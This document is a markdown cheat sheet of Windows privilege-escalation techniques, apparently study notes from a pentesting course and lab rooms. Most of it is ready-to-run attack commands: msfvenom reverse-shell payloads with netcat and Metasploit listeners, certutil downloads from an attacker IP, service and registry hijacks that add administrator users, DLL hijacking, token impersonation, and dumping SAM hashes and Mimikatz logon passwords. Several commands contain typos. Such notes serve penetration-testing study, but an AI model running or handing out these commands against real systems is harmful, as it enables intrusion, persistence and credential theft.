# Windows Privilege Escalation
## //cheat-sheet

**[Back to Command-Center](https://github.com/codetorok/command-center/blob/master/README.md)**

⚠️ **IMPORTANT NOTE:** This is not a tutorial write-up on how to use the different tools and commands, these are quick notes on how to privesc in Windows.

**For the full tutorial and lectures it is highly recommended to take the WINDOWS PRIVESC course from [TCM-SECURITY](https://academy.tcm-sec.com/).**

### Initial Enumeration
#### System Enumeration

* `systeminfo` basic system enumeration
* `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` specific
* `hostname` get hostname
**Windows Managment Instrumentation Command Line** `wmic`
* `wmic qfe` **quick fix engeneering** shows what's available, what's been patched and when
* `wmic qfe get Caption,Description,HotFixID,InstalledOn` looking for specific information
* `wmic logicaldisk` output is a little dirty
* `wmic logicaldisk get caption, description, providername` much cleaner
* `wmic logicaldisk get caption` fast and simple, less details

#### User Enumeration
* `whoami` or `whoami /priv` enumerate ourselves
* `whoami /groups` enumerate our group(s)
* `net user` enumerate users
* `net user administrator` enumeraing a specific user
* `net localgroup` enumerating a group or calling out by name ~net localgroup administrator`

#### Network Enumeration
* `ipconfig` or to get more details `ipconfig /all`
* `arp -a` arp table
* `route print` this will tell us where the machine is communicating
* `netstat -ano` to see what ports are out there, what are these listening ports, what are those port, where are those ports coming from? maybe those services are only available for us from the inside network?

#### Password hunting
* `findstr /si password *.txt` search for password in a text file
* `findstr /si password *.txt *.ini *.config` same as above but searching among multiple file extensions

#### AV / Firewall Enumeration
* `sc query windefend` information about Windows Defender **sc is for service control**
* `sc queryex type= service` listing all the services running on the machine
* `netsh advfirewall firewall dump` older command for info about the firewall
* `netsh firewall show state` more actual command for inf about the firewall
* `netsh firewall show config` to see the firewall's configuration
* `netsh sdvfirewall firewall dump` another variaton for all info on the firewall

### Exploiting via Kernel Exploit

#### Automated Tools
* winPEAS.exe (compile)
* seatbelt.exe (compile)
* Watson.exe (compile)
* Sharpup.exe (compile)

#### Powershell
* Sherlock.ps1
* PowerUp.ps1
* jaws-enum.ps1

#### Other:
* windows-exploit-suggester.py (local)
* exploit suggester Metasploit

#### Exploring Autommated Tools
##### windows-exploit-suggerster.py : Steps to follow with windows-exploit-suggester.py
* 1. install: if regular pip install from repo causes problem, here's a one liner (windows-exploit-suggester.py): `curl https://bootsrtap.pypa.io/get-pyp.py -o get pip.py: python get-pip.py`
* 2. create database: `./windows-exploit-suggester.py --update`
* 3. run `systeminfo` on the target Windows machine and save it into a systeminfo.txt file.
* 4. finally: `./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo systeminfo.txt` systeminfo.txt is your previously saved file.

##### Metasploit
* in metasploit use `run post/multi/recon/local_exploit_suggester`

##### Metasploit and winPEAS
* on target machine from metasploit meterpreter shell:
* `cd /tmp`
* `upload /file_location_directory_on_attacker_machine/winPEAS.exe`
* `shell`
* `./winPEAS.exe`

##### PowerUp
* when in a meterpreter shell you can use: `load powershell`, before running PowerUp.ps1 need to bypass the execution policy for PowerShell: `powershell -ep bypass`

##### manual exploit using msfvenom
* `msfvenom -p windows/shell_reverse_tcp lhost=<attacker machine's IP> lport=<listening port> -f aspx > manual.aspx`
* don't forget to listen on `nc -lnvp <port>`

### Escalation path: password and port forwarding

* **winexe** is a script allowing us to use Linux commands on windows, use it from shell
* `winexe -U Administrator%<password> //127.0.0.1 "cmd.exe"`

* on kali machine `apt install ssh`
* quick mod on ssh itself: `nano /etc/ssh/sshd_config` **#PermitRootLogin** uncomment it and change it's permission to **yes**

#### Using plink.exe

* **Bring file over to target machine in Windows:** `certutil -urlcache -f http://<attack machine's IP>/plink.exe`
* find a folder with wright priv. /tmp is good
* use plink for port forwarding 

#### Windows subsystem for Linux

* `where /R c:\windows bash.exe`

### Impersonation and Potato Attack

#### In Metasploit meterpreter shell

* `getuid`
* `load_incognito`
* `list_tokens -u`
* `impersonate token <domain controller's name>\\<username>`  
* `shell`

#### Checking results

* in Windows: `whoami /priv`
* in metasploit `getprivs`

* alternatively we can use metasploit exploit suggester as well: `run post/multi/recon/exploit_suggester` 

### Escalation path: runas

* `cmdkey /list` shows currently stored credential keys
* use runas.exe tool which is built in to Windows
* run cmd.exe as Administrator leads to root shell:
* ***(similar when running sudo on Linux but here we don't have to have the credentials)***
* `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe \c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt`

### Escalation path: registry

* start PowerShell: `powershell -ey bypass`
* then start PowerUp.ps1: `. .\PowerUp.ps1`
* in PowerUp: `Invoke-AllChecks`
* Check for autologon for credentials. Look for FILE ALL ACCES FOR EVERYONE

#### Check for autoruns

* `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`

#### Using metasploit

* `use multi/handler`
* `set payload windows/meterpreter/reverse_tcp`
* `set lhost <your IP>
* set up payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp lhost=<your IP> -f exe -o program.exe`

#### Using PowerUp

* `Write-suserAddMSI` it's going to set up a file wich we can use to add admin user to the existing ones.
* `net localgroup administrators`

#### there are packages for Windows, called MSI packages are Windows installers. We have the registry feature where they install packages elevated. They will install as an admin user. This is a configuration issue we can take advantage of this. If the value is set to 1 in the registry we can attack it!

##### Detection:

* open command prompt and: `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
* check manually: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` and `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
* if you find from output that ***AlwaysInstallElevated*** value is set to 1 then
* `eg query HKCU\Software\Policies\Microsoft\Windows\Installer`

##### Exploit:

* start metasploit, then `use multi/handler`
* `set payload windows/meterpreter/reverse_tcp`
* `set lhost <your IP`
* `run`
* generate payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp lhost=<your IP> -f msi -o setup.msi`
* place generated setup.msi from kali onto the target machine's /temp folder
* run it and enjoy your shell :)

##### Another method using registry

* start with `powershell -ep bypass`
* from Windows machine copy `C:\Users\User\Desktop\Tools\Source\windows_service.c` to the Kali VM.
* Open ***windows_service.c*** in a text editor and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators user /add`
* Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_service.c -o x.exe` (NOTE: if this is not installed, use `sudo apt install gcc-mingw-w64`) 
* Copy the generated file x.exe, to the Windows VM.
* On the Windows VM copy the generated file.exe to `C:\Temp`
* Open a command prompt and type in `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
* In the command prompt type: `sc start regsvc`
*  It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: ` net localgroup administrators`

### Escalation path: executable files

##### PowerUp

* run ***PowerUp.ps1*** with SHIFT+right click and open up in command prompt
* `powershell -ep bypass` and `Invoke-AllChecks`
* in commands prompt: `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe`
* `sc start filepermservice.exe`
* confirm that the user was added to admin group: `net localgroup administrators`

##### Accesschk

##### Detection:

* `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"`
* who has permission set to: **FILE_ALL_ACCESS** on filepermservice.exe file

##### Exploitation:

* `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
* `sc start filepermsvc`
* confirm that user was added to admin group: `net localgroup administrators`

### Escalation path: startup application

##### Detection:

* Open command prompt and type: `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
* From the output notice that the **`BUILTIN\Users`** group has full access **`(F)`** to the directory.

##### Exploitation:

* in metasploit: `use multi/handler` then `set payload windows/meterpreter/reverse_tcp` set lhost to your IP and `run`
* with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp lhost=<your IP> -f exe -o x.exe`
* place ***x.exe*** on the Windows machine here: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
* when admin logs in you got a shell

### Escalation path: dll hijacking

*  ***.dll*** stands for dynamic library. Shared libraries, variables etc. We often see .dll running with executables, we are looking for a specific instance. At startup Windows is looking for a specific .dll if it doesn't exist we can create one running code in it for our own purposes.

##### Detection:

* Find the ***Process Monitor Filter*** on the Windows machine
* set filter: RESULT, IS, NAME NOT FOUND ***the last one you have to type it in to the search bar***, then INCLUDE and hit ***add***
* PATH is coming up in search results that end with .dll, back to filtering, select PATH, ends with, type in ***.dll***, include and hit ***apply***
* if we can control the service we can overwright the .dll files
* command prompt: `sc start dll svc`
* result shows ***name not found*** those are the good ones

##### Exploitation:

* several options: we can generate a .dll file with a reverse shell in it and just overwrite the original one while listening on nc
* in this case copy selected .dll file to kali
* open it up in gedit
* replace line: `system(....)` with `system("cmd.exe /k net localgroup administrators user /add ");` ***user being the user we want to create***
* compile it: `x86_64-mingw32-gcc windows_dll.c -shared -o <copied_filename_from_win_machine>.dll
* copy generated file over to the Windows machine's ***/temp*** folder.
* command prompt: `sc stop dllsvc & sc start dllsvc`
* checking results: `net localgroup administrators`

### Escalation path: Service Permissions

#### **Important:** in Invoke-Allchecks that we can restart the service, so we can add something to it and restart it!

##### [For reference: Payloads All The Things.](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools)

* **exapmle 1:** found ***daclsvc*** service
* run ***accesschk64.exe*** against it: `accesschk64.exe -wuvc daclsvc`
* query the service: `sc qc daclsvc`
* use the binary path name which is calling out this daclsvc service, we have the changeconfig service we can change the path
* `sc config daclsvc binpath= "net localgroup administrators user /add"`
* it will say ***success!***
* nothing will show up as of now but if we start the service: `sc start daclsvc` then `net localgroup administrators`
* there will be the created "user" withing the administrators group

### Escalation via Unquoted Service Path
### (Because it's not quoted off we can modify it and get malicious with it!)

#### Discovery:

* `accesschk64.exe -uwvc Everyone *`
* We are looking for a few things:
1. **-u** to surpess errors
2. **-w** only objects that have wrigth access
3. **-c** service name
4. **-v** verbose
5. **Everyone** is a group
6. in results look for a ***BINARY_PATH_NAME field*** that displays a path that is not confined between quotes.

#### Exploitation:

* `powershell -ep bypass`
* `. .\PowerUps.ps1`
* `Invoke-AllChecks`
* in msfvenom on kali: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
* copy the generated file ***common.exe***to the Windows VM
* place ***common.exe*** in `C:\Program Files\Unquoted Path Service`
* Windows VM command prompt: `sc start unquotedsvc`
* check if user was added to the local administrators group in the command prompt: `net localgroup administrators`
* for additional practice play: [**Tryhackme.com room: Steal Mountain**](https://tryhackme.com/room/steelmountain)

### Escalation path via CVE-2019-1388

* close down IE, right click on ***hhupd.exe*** file, check properties. Make sure there's no security features in it, if there is make sure to uncheck it
* right click on file, run as adminitrator
* you get the UAC (User Access Control) prompt
* click ***issues by*** certificate, it will open up Internet Explorer as system
* when it opens up, click on the settings cog on the right hand side, ***file*** and then ***save as***
* you'll get an error message, just ignore it
* in the save file as window for file name type in: `C:\Windows\System32\*.*` this will take you to the file system within that window
* what we want to find is the ***cmd.exe*** right click on it, open
* in prompt: `whoami` and we'll see that we are `AUTHORITY\SYSTEM`

### Additionally savgin the Secrets file and SAM and using secretsdump.py to extract their content

* Saving registry keys of interest and using secretsdump.py on them from ***Impacket***
* `reg save HKLM\sam c:\temp\sam.save`
* `reg save HKLM\security c:\temp\security.save`
* `reg save HKLM\system c:\temp\system.save`
* Now that everything is saved, bring these files over to your kali machine and use secretsdump.py
* `secretsdump.py -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save`
* Alternatively there's a post exploitation module in **Metasploit**
* `run post/windows/gather/lsa_secrets`
* The same result can be achieved with the **[lsasecretread binary](https://github.com/linuxmuster/lsaSecrets/blob/master/bin/lsaSecretRead.exe)**
* **Mimikatz** `privilige::debug` and then `sekurlsa:logonPasswords`
